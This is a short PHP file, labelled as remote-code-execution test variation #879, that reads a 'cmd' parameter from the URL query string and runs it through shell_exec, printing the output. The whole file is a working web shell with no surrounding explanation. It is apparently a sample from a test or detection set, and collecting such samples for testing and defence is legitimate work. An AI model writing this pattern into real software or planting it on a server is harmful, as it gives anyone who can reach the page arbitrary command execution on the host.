<?php
// RCE test variation #879
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>